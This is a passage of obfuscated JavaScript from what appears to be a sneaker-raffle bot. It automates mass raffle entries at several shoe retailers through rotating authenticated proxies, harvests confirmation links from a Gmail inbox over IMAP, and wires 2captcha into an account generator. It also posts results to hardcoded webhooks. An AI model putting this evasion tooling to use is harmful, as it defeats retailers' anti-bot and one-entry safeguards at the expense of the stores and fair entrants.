                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x39bdfe = Math['round'](Math['random']() * (_0x13a7b4['length'] - 0x1));
                        _0x166816[_0x20eed8]['Size'] == 'RANDOM' && (_0x166816[_0x20eed8]['Size'] = _0x13a7b4[_0x39bdfe]);
                        var _0x20ae89 = Math['round'](Math['random']() * (_0x7101a8['length'] - 0x1)), _0x5c3bd7 = _0x7101a8[_0x20ae89]['split'](':'), _0xdabb77;
                        try {
                            _0xdabb77 = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5c3bd7[0x0] + ':' + _0x5c3bd7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xdabb77 = await _0x25d1cc['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5c3bd7[0x0] + ':' + _0x5c3bd7[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x43f64a = await _0xdabb77['newPage']();
                            await _0x43f64a['authenticate']({
                                'username': '' + _0x5c3bd7[0x2],
                                'password': '' + _0x5c3bd7[0x3]
                            }), await _0x43f64a['setRequestInterception'](!![]), _0x43f64a['on']('request', _0x3ba689 => {
                                _0x3ba689['resourceType']() === 'image' || _0x3ba689['resourceType']() === 'font' || _0x3ba689['resourceType']() === 'media' ? _0x3ba689['abort']() : _0x3ba689['continue']();
                            }), await _0x43f64a['goto'](_0x166816[_0x20eed8]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x43f64a['waitForSelector']('#accept-all-gdpr'), await _0x43f64a['click']('#accept-all-gdpr'), await _0x43f64a['waitForSelector']('#raffles-product'), await _0x7e80ad(0x3e8), await _0x43f64a['$eval']('#raffles-product', _0x2e4daa => _0x2e4daa['click']()), await _0x7e80ad(0x1388), await _0x43f64a['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x33db93 = await _0x43f64a['$']('.fancybox-inner\x20>\x20iframe'), _0x56fad0 = await _0x33db93['contentFrame']();
                            console['log'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x56fad0['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x7e80ad(0x1f4), await _0x56fad0['type']('input[name=\x22sm-form-email\x22]', _0x166816[_0x20eed8]['Email']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-name\x22]', _0x166816[_0x20eed8]['FirstName'] + '\x20' + _0x166816[_0x20eed8]['LastName']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-street\x22]', _0x166816[_0x20eed8]['Address1'] + '\x20' + _0x166816[_0x20eed8]['HouseNumber'] + '\x20' + _0x166816[_0x20eed8]['Address2']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-city\x22]', _0x166816[_0x20eed8]['City']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-province\x22]', _0x166816[_0x20eed8]['State']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-zip\x22]', _0x166816[_0x20eed8]['Zip']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-country\x22]', _0x166816[_0x20eed8]['Country']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-form-phone\x22]', _0x166816[_0x20eed8]['Phone']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x166816[_0x20eed8]['Follower']), await _0x7e80ad(0xc8), await _0x56fad0['type']('input[name=\x22sm-cst.size\x22]', _0x166816[_0x20eed8]['Size']), await _0x7e80ad(0x1f4), await _0x56fad0['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x7e80ad(0x1f4), await _0x56fad0['click']('.icheckbox_simple-custom'), await _0x7e80ad(0x1f4), console['log'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x56fad0['$eval']('form', _0x3bb0cb => _0x3bb0cb['submit']()), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x535947 = '';
                            var _0x3c22c0 = await _0x296449(_0x166816[_0x20eed8], _0x3eb88b, 'dev', ![]), _0xfef334 = await _0x296449(_0x166816[_0x20eed8], _0x3eb88b, 'pub', ![]);
                            const _0x19264b = {
                                'succesDEVMSG': { 'embeds': [_0x3c22c0] },
                                'succesPUBMSG': { 'embeds': [_0xfef334] }
                            };
                            try {
                                _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x19264b['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x19264b['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x355433, _0x19264b['succesPUBMSG']);
                            } catch (_0x18de01) {
                                console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x18de01));
                            }
                        } catch (_0x373db2) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20' + _0x373db2)), _0x1811cf = '' + _0x373db2;
                            var _0x304a72 = await _0x296449(_0x166816[_0x20eed8], _0x3eb88b, 'dev', !![], _0x1811cf), _0x3c22c0 = await _0x296449(_0x166816[_0x20eed8], _0x3eb88b, 'dev', ![]), _0xfef334 = await _0x296449(_0x166816[_0x20eed8], _0x3eb88b, 'pub', ![]);
                            const _0x3bc2ae = {
                                'succesDEVMSG': { 'embeds': [_0x3c22c0] },
                                'succesPUBMSG': { 'embeds': [_0xfef334] }
                            };
                            _0x3bc2ae['errorDEV'] = { 'embeds': [_0x304a72] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x3bc2ae['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x3bc2ae['errorDEV']), _0x373db2 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x535947 = 'yes');
                        } finally {
                            _0xdabb77['close']();
                            if (_0x535947 == 'yes' && _0x40f354 != 0x5 && _0x1811cf != 'Size\x20Not\x20Found') {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Task\x20' + (_0x20eed8 + 0x1) + '\x20:\x20Retrying')), _0x20eed8 = _0x20eed8 - 0x1, _0x40f354 = _0x40f354 + 0x1;
                                continue;
                            }
                            _0x535947 == 'yes' && _0x40f354 >= 0x5 && (_0xc1caad(_0x166816[_0x20eed8], _0x3eb88b), _0x535947 = 'no', _0x40f354 = 0x0), console['log'](_0x441ea7() + '\x20[' + _0x3eb88b['name'] + ']\x20Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x134f19, _0x1e4dfb) {
                    var _0x349495 = [];
                    async function _0x5d10b6() {
                        var _0x1676f8 = new _0x3602ef({
                            'user': _0x8702f0['masterMail'],
                            'password': _0x8702f0['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x76f13b(_0x2282a9) {
                            _0x1676f8['openBox']('INBOX', ![], _0x2282a9);
                        }
                        _0x1676f8['once']('ready', function () {
                            _0x76f13b(function (_0x2a9f20, _0x261e15) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x2a9f20)
                                    throw _0x2a9f20;
                                _0x1676f8['seq']['search'](['UNSEEN'], function (_0x3c7348, _0x3ac58b) {
                                    if (!_0x3ac58b || !_0x3ac58b['length'])
                                        console['log'](_0x441ea7() + '\x20[' + _0x134f19['name'] + ']\x20No\x20mails\x20found'), _0x1676f8['end']();
                                    else {
                                        var _0xb5ee27 = _0x1676f8['seq']['fetch'](_0x3ac58b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0xb5ee27['on']('message', function (_0x7c270b, _0x4dcdf4) {
                                            var _0x5b7bbf = '(#' + _0x4dcdf4 + ')\x20';
                                            _0x7c270b['on']('body', function (_0x58f307, _0x5e8a29) {
                                                _0x40c426(_0x58f307, (_0x3dd4e9, _0x3b0dce) => {
                                                    if (_0x3b0dce['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x3cb532 = _0x3b0dce['html']['split']('\x0a');
                                                        for (var _0x4efbb7 = 0x0; _0x4efbb7 < _0x3cb532['length']; _0x4efbb7++) {
                                                            if (_0x3cb532[_0x4efbb7]['includes']('salesmanago') && _0x3cb532[_0x4efbb7]['includes']('<td') && _0x3cb532[_0x4efbb7]['includes']('href')) {
                                                                var _0x27a972 = _0x3cb532[_0x4efbb7]['split']('href=\x22'), _0x3be5ed = _0x27a972[0x1]['split']('\x22')[0x0];
                                                                _0x349495['push'](_0x3be5ed);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x7c270b['once']('end', function () {
                                            });
                                        }), _0xb5ee27['once']('error', function (_0x78dbf1) {
                                            console['log']('Fetch\x20error:\x20' + _0x78dbf1);
                                        }), _0xb5ee27['once']('end', function () {
                                            _0x1676f8['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1676f8['once']('error', function (_0x48691a) {
                            console['log'](_0x1a235e['red'](_0x48691a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x1676f8['once']('end', async function () {
                        }), _0x1676f8['connect']();
                    }
                    async function _0x3dc797(_0x2846da, _0x1fc44c, _0x2d957b) {
                        for (var _0x4c231b = 0x0; _0x4c231b < _0x1fc44c['length']; _0x4c231b++) {
                            async function _0x2c343b(_0x3e4484, _0x362ab0, _0x21ef75, _0x538f29, _0x1487d0) {
                                var _0xbc0a7f, _0x51eb27 = {}, _0x4f49f0 = [], _0x18cb7e = {}, _0x3930c3 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x16854d = Math['round'](Math['random']() * (_0x3930c3['length'] - 0x1));
                                _0x538f29[_0x3e4484]['Size'] == 'RANDOM' && (_0x538f29[_0x3e4484]['Size'] = _0x3930c3[_0x16854d]);
                                !_0x538f29 && (_0x538f29 = {});
                                if (_0x8702f0['useRandomProxy'] = ![])
                                    var _0x57459b = _0x1487d0[_0x3e4484]['split'](':');
                                else
                                    var _0x551e89 = Math['round'](Math['random']() * (_0x1487d0['length'] - 0x1)), _0x57459b = _0x1487d0[_0x551e89]['split'](':');
                                var _0x3e80b4 = {
                                    'jar': _0x44b991,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x21ef75['url'],
                                    'headers': _0x21ef75['headers'],
                                    'body': JSON['stringify'](_0x51eb27),
                                    'proxy': 'http://' + _0x57459b[0x2] + ':' + _0x57459b[0x3] + '@' + _0x57459b[0x0] + ':' + _0x57459b[0x1]
                                };
                                return _0x362ab0 != 'ver' && (_0x3e80b4['url'] = _0x21ef75['url'], _0x3e80b4['headers'] = _0x21ef75['headers']), _0x362ab0 == 'ver' && (_0x3e80b4['method'] = 'GET', _0x3e80b4['url'] = _0x538f29[_0x3e4484]), new Promise(function (_0xb03a4c, _0x273f74) {
                                    callback = async (_0x2c2e04, _0x102a52, _0x26a9af) => {
                                        if (!_0x2c2e04 && _0x102a52['statusCode'] == 0xca || !_0x2c2e04 && _0x102a52['statusCode'] == 0xc8) {
                                            if (_0x362ab0 != 'ver') {
                                                var _0x4c1baf = await _0x296449(_0x538f29[_0x3e4484], _0x21ef75, 'dev', ![]), _0x3afcba = await _0x296449(_0x538f29[_0x3e4484], _0x21ef75, 'pub', ![]);
                                                const _0x48ea99 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4c1baf] },
                                                    'succesPUBMSG': { 'embeds': [_0x3afcba] }
                                                };
                                                if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                                    try {
                                                        await _0x10a0d6(_0x8702f0['webhook'], _0x48ea99['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x48ea99['succesDEVMSG']), await _0x7e80ad(0xc8);
                                                try {
                                                    await _0x10a0d6(_0x355433, _0x48ea99['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4bdc1f(_0x538f29[_0x3e4484], _0x21ef75);
                                            }
                                            _0xb03a4c(console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x21ef75['name'] + ']\x20Task\x20' + (_0x3e4484 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x362ab0 != 'ver') {
                                                var _0x4407a3 = '' + _0x2c2e04, _0x46fccf = await _0x296449(_0x538f29[_0x3e4484], _0x21ef75, 'dev', !![], _0x4407a3), _0x38f9d6 = {};
                                                _0x38f9d6['errorDEV'] = { 'embeds': [_0x46fccf] }, _0xc1caad(_0x538f29[_0x3e4484], _0x21ef75), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x38f9d6['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x38f9d6['errorDEV']);
                                            }
                                            _0x273f74(console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x21ef75['name'] + ']\x20Task\x20' + (_0x3e4484 + 0x1) + ':\x20' + _0x2c2e04)));
                                        }
                                    };
                                    try {
                                        _0x362ab0 != 'ver' ? console['log'](_0x441ea7() + '\x20[' + _0x21ef75['name'] + ']\x20Task\x20' + (_0x3e4484 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x51eb27['data']['attributes']['email']) : console['log'](_0x441ea7() + '\x20[' + _0x21ef75['name'] + ']\x20Task\x20' + (_0x3e4484 + 0x1) + ':\x20Fetching\x20Response'), _0x394d0f(_0x3e80b4, callback);
                                    } catch (_0x1430be) {
                                        console['log'](_0x441ea7() + '\x20Task\x20' + (_0x3e4484 + 0x1) + ':\x20' + _0x1430be);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2c343b(_0x4c231b, 'ver', _0x2846da, _0x1fc44c, _0x2d957b), console['log'](_0x441ea7() + '\x20[' + _0x2846da['name'] + ']\x20Sleeping\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                            } catch (_0x235613) {
                            }
                        }
                    }
                    try {
                        _0x5d10b6(), await _0x7e80ad(0xfa0), console['log']('Found\x20' + _0x349495['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x3dc797(_0x134f19, _0x349495, _0x1e4dfb);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x404e10, _0x25a4b2, _0x22ad69) {
                for (var _0x25e018 = 0x0; _0x25e018 < _0x25a4b2['length']; _0x25e018++) {
                    _0x8702f0['AfewDelay'] = _0x8702f0['delay'];
                    var _0x477bdf;
                    if (_0x3074fa != 'yes')
                        var _0x3074fa = '', _0x53746f = 0x0;
                    var _0x2ecc8e = _0x25a4b2[_0x25e018]['Url'];
                    _0x16d703(_0x404e10['name'] + '\x20Task\x20' + (_0x25e018 + 0x1) + '\x20/\x20' + _0x25a4b2['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x25a4b2, _0x25e018);
                    var _0x5d3138 = await _0x296449(_0x25a4b2[_0x25e018], _0x404e10, 'dev', ![]), _0xbe37b8 = await _0x296449(_0x25a4b2[_0x25e018], _0x404e10, 'pub', ![]);
                    const _0x1d75e2 = {
                        'succesDEVMSG': { 'embeds': [_0x5d3138] },
                        'succesPUBMSG': { 'embeds': [_0xbe37b8] }
                    };
                    if (_0x25a4b2[_0x25e018]['Email'] == '' || _0x25a4b2[_0x25e018]['FirstName'] == '' || _0x25a4b2[_0x25e018]['LastName'] == '' || _0x25a4b2[_0x25e018]['Country'] == '' || _0x25a4b2[_0x25e018]['Size'] == '' || _0x25a4b2[_0x25e018]['Address1'] == '' || _0x25a4b2[_0x25e018]['Zip'] == '') {
                        console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x8702f0['useRandomProxy'] = ![])
                        var _0x17b867 = _0x22ad69[_0x25e018]['split'](':');
                    else
                        var _0x786388 = Math['round'](Math['random']() * (_0x22ad69['length'] - 0x1)), _0x17b867 = _0x22ad69[_0x786388]['split'](':');
                    const _0x3d8cfd = await _0x25d1cc['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x17b867[0x0] + ':' + _0x17b867[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x401ffc = await _0x3d8cfd['newPage']();
                        await _0x401ffc['setDefaultNavigationTimeout'](0x1d4c0), await _0x401ffc['authenticate']({
                            'username': '' + _0x17b867[0x2],
                            'password': '' + _0x17b867[0x3]
                        }), console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x401ffc['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x401ffc['setRequestInterception'](!![]), _0x401ffc['on']('request', _0x23aae1 => {
                            _0x23aae1['resourceType']() === 'image' || _0x23aae1['resourceType']() === 'font' || _0x23aae1['resourceType']() === 'media' ? _0x23aae1['abort']() : _0x23aae1['continue']();
                        }), await _0x401ffc['goto'](_0x2ecc8e, { 'waitUntil': 'networkidle2' }), console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x401ffc['waitForTimeout'](0xfa0), console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x401ffc['waitForTimeout'](0x320);
                        if (_0x25a4b2[_0x25e018]['Size'] == 'RANDOM') {
                            console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0xe30ec = await _0x401ffc['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x3a2e03 => {
                                return _0x3a2e03['map'](_0x4b3e4b => _0x4b3e4b['href']);
                            });
                            var _0xee8dba = Math['round'](Math['random']() * (_0xe30ec['length'] - 0x1));
                            await _0x401ffc['goto']('' + _0xe30ec[_0xee8dba]);
                        } else {
                            console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x25a4b2[_0x25e018]['Size']);
                            try {
                                const _0x4aa52c = await _0x401ffc['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x25a4b2[_0x25e018]['Size'] + '\x22]\x20>\x20a', _0x5ecaf9 => {
                                    return _0x5ecaf9['map'](_0xf55383 => _0xf55383['href']);
                                });
                                await _0x401ffc['goto']('' + _0x4aa52c[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x3c5e13) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20' + _0x3c5e13 + '\x20Size\x20not\x20found')), _0x477bdf = 'Size\x20Not\x20Found';
                                var _0x4b163a = await _0x296449(_0x25a4b2[_0x25e018], _0x404e10, 'dev', !![], _0x477bdf);
                                _0x1d75e2['errorDEV'] = { 'embeds': [_0x4b163a] };
                                _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x1d75e2['errorDEV']);
                                await _0x10a0d6(_0x5cf6ec, _0x1d75e2['errorDEV']);
                                continue;
                            }
                        }
                        await _0x401ffc['waitForTimeout'](0x258), await _0x401ffc['type']('#raffle-instagram', '' + _0x25a4b2[_0x25e018]['Follower'], { 'delay': 0x64 }), await _0x401ffc['waitForTimeout'](0x384), await _0x401ffc['click']('#raffle-terms'), await _0x401ffc['waitForTimeout'](0x384), await _0x401ffc['evaluate'](() => {
                            const _0x2e6497 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x2e6497['click']();
                        }), await _0x401ffc['waitForTimeout'](0xbb8), await _0x401ffc['waitForSelector']('#checkout_email'), await _0x7e80ad(0x3e8), console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x401ffc['type']('#checkout_email', '' + _0x25a4b2[_0x25e018]['Email'], 0x32), await _0x7e80ad(0x320), await _0x401ffc['select']('#checkout_shipping_address_country', '' + _0x25a4b2[_0x25e018]['Country']), await _0x401ffc['waitForTimeout'](0x258), await _0x401ffc['type']('#checkout_shipping_address_first_name', '' + _0x25a4b2[_0x25e018]['FirstName']), await _0x401ffc['waitForTimeout'](0x320), await _0x401ffc['type']('#checkout_shipping_address_last_name', '' + _0x25a4b2[_0x25e018]['LastName']), await _0x401ffc['waitForTimeout'](0x2bc), await _0x401ffc['type']('#checkout_shipping_address_address1', _0x25a4b2[_0x25e018]['Address1'] + '\x20' + _0x25a4b2[_0x25e018]['HouseNumber']), await _0x401ffc['waitForTimeout'](0x2bc), await _0x401ffc['type']('#checkout_shipping_address_address2', '' + _0x25a4b2[_0x25e018]['Address2']), await _0x401ffc['waitForTimeout'](0x2bc);
                        _0x25a4b2[_0x25e018]['Postcode'] == undefined ? await _0x401ffc['type']('#checkout_shipping_address_zip', '' + _0x25a4b2[_0x25e018]['Zip']) : await _0x401ffc['type']('#checkout_shipping_address_zip', '' + _0x25a4b2[_0x25e018]['Postcode']);
                        await _0x401ffc['waitForTimeout'](0x2bc), await _0x401ffc['type']('#checkout_shipping_address_city', '' + _0x25a4b2[_0x25e018]['City']), await _0x401ffc['waitForTimeout'](0x2bc), console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x401ffc, _0x401ffc['evaluate'](() => {
                            const _0x432e18 = document['querySelector']('#continue_button');
                            for (var _0x52988b = 0x0; _0x52988b < 0x5; _0x52988b++) {
                                if (_0x432e18) {
                                    _0x432e18['click'](), _0x432e18['click']();
                                    break;
                                } else
                                    _0x7e80ad(0xfa0);
                            }
                        }), await _0x401ffc['waitForTimeout'](0x1194);
                        try {
                            await _0x401ffc['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x401ffc['evaluate'](() => {
                            const _0x177a1e = document['querySelector']('#continue_button');
                            for (var _0x21e20e = 0x0; _0x21e20e < 0x5; _0x21e20e++) {
                                if (_0x177a1e) {
                                    _0x177a1e['click']();
                                    break;
                                } else
                                    _0x7e80ad(0xfa0);
                            }
                        }), await _0x401ffc['waitForTimeout'](0x7d0), console['log'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x401ffc['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x401ffc['evaluate'](() => {
                            const _0x292a6a = document['querySelector']('#continue_button');
                            for (var _0x54f15a = 0x0; _0x54f15a < 0x5; _0x54f15a++) {
                                if (_0x292a6a) {
                                    _0x292a6a['click']();
                                    break;
                                } else
                                    _0x7e80ad(0xfa0);
                            }
                        }), await _0x401ffc['waitForTimeout'](0x1194), await _0x401ffc['waitForSelector']('#continue_button'), _0x401ffc['evaluate'](() => {
                            const _0x55c8e9 = document['querySelector']('#continue_button');
                            for (var _0x357bc5 = 0x0; _0x357bc5 < 0x5; _0x357bc5++) {
                                if (_0x55c8e9) {
                                    _0x55c8e9['click']();
                                    break;
                                } else
                                    _0x7e80ad(0xfa0);
                            }
                        });
                        try {
                            await _0x401ffc['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x3074fa = 'no', _0x4bdc1f(_0x25a4b2[_0x25e018], _0x404e10), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                try {
                                    await _0x10a0d6(_0x8702f0['webhook'], _0x1d75e2['succesDEVMSG']);
                                } catch {
                                }
                            await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x1d75e2['succesDEVMSG']), await _0x7e80ad(0xc8);
                            try {
                                await _0x10a0d6(_0x355433, _0x1d75e2['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x408bc3) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x408bc3));
                        }
                    } catch (_0x1265b6) {
                        console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20' + _0x1265b6)), _0x477bdf = '' + _0x1265b6;
                        var _0x4b163a = await _0x296449(_0x25a4b2[_0x25e018], _0x404e10, 'dev', !![], _0x477bdf);
                        _0x1d75e2['errorDEV'] = { 'embeds': [_0x4b163a] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x1d75e2['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x1d75e2['errorDEV']), _0x3074fa = 'yes';
                    } finally {
                        _0x3d8cfd && _0x3d8cfd['close']();
                        if (_0x3074fa == 'yes' && _0x53746f != 0x5 && _0x477bdf != 'Size\x20Not\x20Found') {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x404e10['name'] + ']\x20Task\x20' + (_0x25e018 + 0x1) + '\x20:\x20Retrying')), _0x25e018 = _0x25e018 - 0x1, _0x53746f = _0x53746f + 0x1;
                            continue;
                        }
                        _0x3074fa == 'yes' && _0x53746f >= 0x5 && (_0xc1caad(_0x25a4b2[_0x25e018], _0x404e10), _0x3074fa = 'no', _0x53746f = 0x0);
                        if (_0x25e018 + 0x1 == _0x25a4b2['length']) {
                            await _0x7e80ad(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x8702f0['AfewDelay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xaa0383, _0x2ac825, _0x34183f) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x195c46 = 0x0; _0x195c46 < _0x2ac825['length']; _0x195c46++) {
                        if (_0x38b92e != 'yes')
                            var _0x38b92e = '', _0x1b6806 = 0x0;
                        var _0x109a9b;
